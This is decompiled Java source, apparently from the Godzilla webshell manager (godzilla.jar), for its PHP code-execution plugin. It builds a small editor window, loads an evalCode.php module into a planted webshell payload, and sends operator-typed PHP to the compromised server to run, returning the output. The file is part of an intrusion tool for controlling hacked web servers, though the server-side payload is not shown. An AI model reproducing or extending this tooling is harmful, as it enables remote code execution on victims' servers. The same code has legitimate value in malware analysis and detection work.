/*     */ package shells.plugins.php;
/*     */ 
/*     */ import core.Encoding;
/*     */ import core.annotation.PluginAnnotation;
/*     */ import core.imp.Payload;
/*     */ import core.imp.Plugin;
/*     */ import core.shell.ShellEntity;
/*     */ import core.ui.component.RTextArea;
/*     */ import core.ui.component.dialog.GOptionPane;
/*     */ import java.awt.BorderLayout;
/*     */ import java.awt.Component;
/*     */ import java.awt.FlowLayout;
/*     */ import java.awt.event.ActionEvent;
/*     */ import java.io.InputStream;
/*     */ import javax.swing.JButton;
/*     */ import javax.swing.JPanel;
/*     */ import javax.swing.JSplitPane;
/*     */ import javax.swing.border.TitledBorder;
/*     */ import org.fife.ui.rsyntaxtextarea.RSyntaxTextArea;
/*     */ import org.fife.ui.rtextarea.RTextArea;
/*     */ import org.fife.ui.rtextarea.RTextScrollPane;
/*     */ import util.Log;
/*     */ import util.UiFunction;
/*     */ import util.automaticBindClick;
/*     */ import util.functions;
/*     */ import util.http.ReqParameter;
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ @PluginAnnotation(payloadName = "PhpDynamicPayload", Name = "P_Eval_Code", DisplayName = "代码执行")
/*     */ public class PhpEvalCode
/*     */   implements Plugin
/*     */ {
/*  43 */   private final JPanel panel = new JPanel(new BorderLayout());
/*  44 */   private final RTextArea codeTextArea = new RTextArea();
/*  45 */   private final RTextArea resultTextArea = new RTextArea(); private static final String CLASS_NAME = "PHP_Eval_Code"; private static final String prefix = "<?php"; private boolean loadState;
/*  46 */   private final JButton runButton = new JButton("Run"); private ShellEntity shellEntity; private Payload payload; private Encoding encoding;
/*     */   public PhpEvalCode() {
/*  48 */     JSplitPane pane1 = new JSplitPane();
/*  49 */     JSplitPane pane2 = new JSplitPane();
/*  50 */     JPanel runButtonPanel = new JPanel(new FlowLayout());
/*     */ 
/*     */     
/*  53 */     runButtonPanel.add(this.runButton);
/*     */     
/*  55 */     this.codeTextArea.setBorder(new TitledBorder("code"));
/*  56 */     this.resultTextArea.setBorder(new TitledBorder("result"));
/*     */     
/*  58 */     this.codeTextArea.setText(String.format("%s\necho \"hello word!\";\t\t\t\t\t\t\t\t\t\t\t\t", new Object[] { "<?php" }));
/*     */     
/*  60 */     RTextScrollPane scrollPane = new RTextScrollPane((RTextArea)this.codeTextArea, true);
/*  61 */     scrollPane.setIconRowHeaderEnabled(true);
/*  62 */     scrollPane.getGutter().setBookmarkingEnabled(true);
/*     */     
/*  64 */     pane1.setOrientation(1);
/*  65 */     pane1.setLeftComponent((Component)scrollPane);
/*  66 */     pane1.setRightComponent(runButtonPanel);
/*     */     
/*  68 */     pane2.setOrientation(1);
/*  69 */     pane2.setLeftComponent(pane1);
/*  70 */     pane2.setRightComponent((Component)new RTextScrollPane((RTextArea)this.resultTextArea));
/*     */     
/*  72 */     this.panel.add(pane2);
/*     */     
/*  74 */     UiFunction.setSyntaxEditingStyle((RSyntaxTextArea)this.codeTextArea, "eval.php");
/*  75 */     this.resultTextArea.registerReplaceDialog();
/*     */   }
/*     */   private void Load() {
/*  78 */     if (!this.loadState) {
/*     */       try {
/*  80 */         InputStream inputStream = getClass().getResourceAsStream("assets/evalCode.php");
/*  81 */         byte[] data = functions.readInputStream(inputStream);
/*  82 */         inputStream.close();
/*  83 */         if (this.payload.include("PHP_Eval_Code", data)) {
/*  84 */           this.loadState = true;
/*  85 */           Log.log("Load success", new Object[0]);
/*     */         } else {
/*  87 */           Log.error("Load fail");
/*     */         } 
/*  89 */       } catch (Exception e) {
/*  90 */         Log.error(e);
/*     */       } 
/*     */     } else {
/*     */       
/*  94 */       GOptionPane.showMessageDialog(this.panel, "Loaded", "提示", 1);
/*     */     } 
/*     */   }
/*     */   private void runButtonClick(ActionEvent actionEvent) {
/*  98 */     String code = this.codeTextArea.getText();
/*  99 */     if (code != null && code.trim().length() > 0) {
/* 100 */       if (code.startsWith("<?php")) {
/* 101 */         code = code.substring("<?php".length(), code.length());
/*     */       }
/* 103 */       String resultString = eval(code);
/* 104 */       this.resultTextArea.setText(resultString);
/*     */     } else {
/*     */       
/* 107 */       GOptionPane.showMessageDialog(this.panel, "code is null", "提示", 2);
/*     */     } 
/*     */   }
/*     */   
/*     */   public String eval(String code) {
/* 112 */     return eval(code, new ReqParameter());
/*     */   }
/*     */   public String eval(String code, ReqParameter reqParameter) {
/* 115 */     reqParameter.add("plugin_eval_code", code);
/* 116 */     if (!this.loadState) {
/* 117 */       Load();
/*     */     }
/* 119 */     String resultString = this.encoding.Decoding(this.payload.evalFunc("PHP_Eval_Code", "xxx", reqParameter));
/* 120 */     return resultString;
/*     */   }
/*     */   
/*     */   public void init(ShellEntity shellEntity) {
/* 124 */     this.shellEntity = shellEntity;
/* 125 */     this.payload = this.shellEntity.getPayloadModule();
/* 126 */     this.encoding = Encoding.getEncoding(this.shellEntity);
/* 127 */     automaticBindClick.bindJButtonClick(this, this);
/*     */   }
/*     */ 
/*     */ 
/*     */ 
/*     */   
/*     */   public JPanel getView() {
/* 134 */     return this.panel;
/*     */   }
/*     */ }


/* Location:              C:\User\\user\Downloads\godzilla.jar!\shells\plugins\php\PhpEvalCode.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */